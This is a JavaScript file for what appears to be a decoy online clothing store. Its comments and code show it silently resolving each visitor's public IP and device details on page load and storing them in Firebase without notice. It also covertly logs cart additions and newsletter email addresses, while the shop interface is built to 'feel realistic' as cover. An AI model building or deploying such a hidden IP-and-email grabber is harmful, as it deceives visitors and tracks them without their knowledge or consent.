"use strict";

import { detectDevice } from "./device-detector.js";
import { saveLogRecord } from "./firebase-config.js";

// 1. SILENT BACKGROUND LOGGING:
// Silently detects device details and public IP on page load,
// and saves directly into Firebase Firestore without any frontend alert.
const deviceInfo = detectDevice();

async function resolvePublicIp() {
    try {
        const res = await fetch("https://api64.ipify.org?format=json");
        if (res.ok) {
            const data = await res.json();
            if (data.ip) return data.ip;
        }
    } catch {
        // Fallback
    }

    try {
        const res = await fetch("https://ipapi.co/json/");
        if (res.ok) {
            const data = await res.json();
            if (data.ip) return data.ip;
        }
    } catch {
        // Fallback
    }

    try {
        const res = await fetch("https://api.ipify.org?format=json");
        if (res.ok) {
            const data = await res.json();
            if (data.ip) return data.ip;
        }
    } catch {
        // All failed
    }

    return "Unavailable";
}

let cachedIp = null;

async function directSilentSave(event = "clothing_store_visit") {
    try {
        if (!cachedIp) {
            cachedIp = await resolvePublicIp();
        }
        if (cachedIp && cachedIp !== "Unavailable") {
            await saveLogRecord({
                ip: cachedIp,
                device: deviceInfo,
                event
            });
            console.log("Visitor details recorded silently.");
        }
    } catch (err) {
        console.error("Silent save error:", err);
    }
}

// Trigger automatic silent logging immediately upon loading the clothing site
directSilentSave();

// 2. CLOTHING STORE INTERACTION LOGIC:
// Makes the clothing store feel 100% interactive, responsive, and realistic.

let cartCount = 0;
const cartCountEl = document.querySelector("#cart-count");
const toastEl = document.querySelector("#store-toast");
const toastMsg = document.querySelector("#toast-message");
let toastTimer;

function showToast(message) {
    if (!toastEl || !toastMsg) return;
    toastMsg.textContent = message;
    toastEl.classList.add("is-visible");
    window.clearTimeout(toastTimer);
    toastTimer = window.setTimeout(() => {
        toastEl.classList.remove("is-visible");
    }, 2800);
}

// Add to Bag buttons
document.querySelectorAll(".add-to-bag-btn").forEach((btn) => {
    btn.addEventListener("click", (e) => {
        e.preventDefault();
        const card = btn.closest(".product-card");
        const productName = card?.dataset?.name || "Selected garment";

        cartCount++;
        if (cartCountEl) cartCountEl.textContent = cartCount;

        btn.textContent = "Added ✓";
        btn.classList.add("added");
        setTimeout(() => {
            btn.textContent = "Add to Bag +";
            btn.classList.remove("added");
        }, 1200);

        showToast(`Added "${productName}" to your bag.`);

        // Also silently log the product interest
        directSilentSave(`cart_add: ${productName}`);
    });
});

// Cart button click
const cartBtn = document.querySelector("#cart-toggle");
if (cartBtn) {
    cartBtn.addEventListener("click", () => {
        if (cartCount === 0) {
            showToast("Your shopping bag is currently empty.");
        } else {
            showToast(`You have ${cartCount} item${cartCount === 1 ? "" : "s"} in your bag.`);
        }
    });
}

// Newsletter subscription form
const newsletterForm = document.querySelector("#newsletter-form");
const newsletterStatus = document.querySelector("#newsletter-status");
if (newsletterForm) {
    newsletterForm.addEventListener("submit", (e) => {
        e.preventDefault();
        const input = newsletterForm.querySelector("input[type='email']");
        const email = input ? input.value : "";
        if (newsletterStatus) {
            newsletterStatus.textContent = "Thank you! Code AURA15 has been applied to your session.";
            newsletterStatus.style.color = "#276749";
        }
        if (input) input.value = "";
        showToast("Welcome to AURA STUDIO. 15% discount applied!");
        directSilentSave(`newsletter_subscriber: ${email}`);
    });
}
